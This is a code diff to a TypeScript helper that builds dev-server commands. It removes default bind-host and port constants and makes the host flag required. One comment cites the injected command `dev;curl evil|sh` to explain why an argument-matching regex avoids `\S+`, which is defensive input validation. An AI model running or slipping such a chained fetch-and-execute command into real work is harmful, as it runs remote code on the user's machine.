@@ -5,20 +5,6 @@
  */
 export const DEFAULT_SERVE_COMMAND = "npm run dev";
 
-/** What most dev servers call the bind-address flag. Next spells it `--hostname`
- * and exits on `--host`, which is what `site.devHostFlag` is for. */
-const DEFAULT_HOST_FLAG = "--host";
-
-/**
- * Where `site dev` binds when nothing says otherwise. `0.0.0.0` because the
- * command exists for a hosted sandbox, whose preview is reached from outside the
- * container — a loopback default would make it unreachable. On a developer's own
- * machine that also exposes the dev server to the LAN, so `site.devHost` is
- * there to narrow it. `base44 dev` is unaffected: it binds nothing.
- */
-export const DEFAULT_DEV_HOST = "0.0.0.0";
-export const DEFAULT_DEV_PORT = 5173;
-
 // A script name and a `--prefix` path, as charsets rather than `\S+`: the latter
 // matches `dev;curl evil|sh`, so the predicate would answer "yes, this forwards
 // arguments" for a line whose second command is what receives them.
@@ -48,7 +34,7 @@ interface ServeAddress {
   host?: string;
   port?: number;
   /** How this dev server spells its bind-address flag. */
-  hostFlag?: string;
+  hostFlag: string;
 }
 
 function runnerFor(serveCommand: string) {
@@ -69,7 +55,7 @@ export function withServeAddress(
 ): { command: string; droppedAddress: boolean } {
   const command = serveCommand.trim();
   const args = [
-    ...(host ? [hostFlag ?? DEFAULT_HOST_FLAG, host] : []),
+    ...(host ? [hostFlag, host] : []),
     ...(port === undefined ? [] : ["--port", String(port)]),
   ];
   if (args.length === 0) {
